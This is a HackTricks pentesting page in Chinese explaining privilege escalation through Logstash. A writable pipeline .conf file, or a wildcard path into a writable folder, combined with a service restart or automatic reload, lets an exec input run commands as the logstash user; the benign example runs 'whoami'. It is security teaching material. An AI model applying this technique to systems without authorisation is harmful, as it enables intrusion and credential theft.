<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


## Logstash

Logstash用于通过称为**管道**的系统**收集、转换和分发日志**。这些管道由**输入**、**过滤器**和**输出**阶段组成。当Logstash在受损的计算机上运行时，会出现一个有趣的方面。

### 管道配置

管道在文件**/etc/logstash/pipelines.yml**中进行配置，该文件列出了管道配置的位置：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
这个文件揭示了包含管道配置的 **.conf** 文件的位置。在使用 **Elasticsearch 输出模块** 时，通常会在 **pipelines** 中包含 **Elasticsearch 凭据**，这些凭据通常具有广泛的权限，因为 Logstash 需要将数据写入 Elasticsearch。配置路径中的通配符允许 Logstash 执行指定目录中的所有匹配管道。

### 通过可写管道进行权限提升

要尝试权限提升，首先要确定 Logstash 服务正在运行的用户，通常是 **logstash** 用户。确保您满足以下 **一个** 条件之一：

- 拥有对管道 **.conf** 文件的 **写入访问权限** **或**
- **/etc/logstash/pipelines.yml** 文件使用通配符，并且您可以写入目标文件夹

此外，必须满足以下 **一个** 条件之一：

- 有能力重新启动 Logstash 服务 **或**
- **/etc/logstash/logstash.yml** 文件中设置了 **config.reload.automatic: true**

给定配置中的通配符，创建一个与此通配符匹配的文件允许执行命令。例如：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
在这里，**interval** 确定了以秒为单位的执行频率。在给定的示例中，**whoami** 命令每 120 秒运行一次，并将其输出重定向到 **/tmp/output.log**。

在 **/etc/logstash/logstash.yml** 中设置 **config.reload.automatic: true**，Logstash 将自动检测并应用新的或修改过的管道配置，无需重新启动。如果没有通配符，仍然可以对现有配置进行修改，但建议谨慎操作以避免中断。


## 参考资料

* [https://insinuator.net/2021/01/pentesting-the-elk-stack/](https://insinuator.net/2021/01/pentesting-the-elk-stack/)


<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的 **公司广告** 或 **下载 PDF 版本的 HackTricks**，请查看 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向 **HackTricks** 和 **HackTricks Cloud** github 仓库提交 PR 来分享您的黑客技巧。

</details>
